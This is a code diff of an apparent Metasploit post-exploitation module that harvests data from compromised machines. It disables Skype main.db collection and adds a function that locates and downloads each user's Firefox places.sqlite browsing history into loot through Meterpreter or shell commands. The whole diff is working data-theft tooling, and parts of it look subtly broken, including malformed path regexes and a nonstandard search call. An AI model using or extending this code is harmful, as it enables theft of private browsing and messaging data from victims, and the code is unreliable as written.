@@ -44,15 +44,16 @@ class Metasploit3 < Msf::Post
     print_status("Hello from Metasploit! ")
        grab_user_profiles().each do |p|
 
+  # SKYPE W3RKS.  COMMENTING OUT FOR NOW
   #Check for Skype      
-          if check_skype(p['AppData'],p['UserName'])
-            db_in_loot = download_db(p)
-          end
+  #        if check_skype(p['AppData'],p['UserName'])
+  #          db_in_loot = download_db(p)
+  #        end
 
   #Check for Firefox (Mozilla folder)
       
           if check_firefox(p['AppData'],p['UserName'])
-          
+            db_in_loot = download_firefox(p)
           end
        
     end
@@ -78,14 +79,10 @@ def check_skype(path, user)
   end
 
 
-    # Download file using Meterpreter functionality and returns path in loot for the file
+    # Download Skype's main.db file using Meterpreter functionality and return path in loot for the file
   def download_db(profile)
     if session.type =~ /meterpreter/
-      if sysinfo['OS'] =~ /Mac OS X/
-        file = session.fs.file.search("#{profile['dir']}/Library/Application Support/Skype/","main.db",true)
-      else
-        file = session.fs.file.search("#{profile['AppData']}\\Skype","main.db",true)
-      end
+      file = session.fs.file.search("#{profile['AppData']}\\Skype","main.db",true)
     else
       file = cmd_exec("mdfind","-onlyin #{profile['dir']} -name main.db").split("\n").collect {|p| if p =~ /Skype\/\w*\/main.db$/; p; end }.compact
     end
@@ -121,7 +118,8 @@ def check_skype(path, user)
     end
     return file_loc
   end
- 
+
+  # Check for installation of Firefox
   def check_firefox(path, user)
     dirs = []
     if session.type =~ /meterpreter/
@@ -131,13 +129,58 @@ def check_skype(path, user)
     else
       dirs = cmd_exec("ls -m \"#{path}\"").split(", ")
     end
+    
     dirs.each do |dir|
       if dir =~ /Mozilla/
-        print_good("Firefox found for #{user}")
+        print_good("Mozilla folder found for #{user}")
         return true
       end
     end
     print_error("Firefox is not installed for #{user}")
     return false
+  end
+ 
+  # Download Firefox places.sqlite
+
+  def download_firefox(profile)
+        if session.type =~ /meterpreter/
+          guid = session.fs.search("#{profile['AppData']}\\Mozilla","/\w.default/",true)
+      file = session.fs.file.search("#{profile['AppData']}\\Mozilla\\#{guid}","places.sqlite",true)
+
+      
+    else
+      file = cmd_exec("mdfind","-onlyin #{profile['dir']} -name places.sqlite").split("\n").collect {|p| if p =~ /Mozilla\Firefox\/\w.default\/places.sqlite$/; p; end }.compact
+    end
+
+    file_loc = store_loot("firefox.history",
+        "binary/db",
+        session,
+        "places.sqlite",
+        "Firefox History for User #{profile['UserName']} Profile"
+      )
+
+    file.each do |db|
+      if session.type =~ /meterpreter/
+        maindb = "#{db['path']}#{session.fs.file.separator}#{db['name']}"
+        print_status("Downloading #{maindb}")
+        session.fs.file.download_file(file_loc,maindb)
+      else
+        print_status("Downloading #{db}")
+        # Giving it 1:30 minutes to download since the file could be several MB
+        maindb = cmd_exec("cat", "\"#{db}\"", datastore['TIMEOUT'])
+        if maindb.nil?
+          print_error("Could not download the file. Set the TIMEOUT option to a higher number.")
+          return
+        end
+        # Saving the content as binary so it can be used
+        output = ::File.open(file_loc, "wb")
+        maindb.each_line do |d|
+          output.puts(d)
+        end
+        output.close
+      end
+      print_good("Configuration database saved to #{file_loc}")
+    end
+    return file_loc
   end
 end
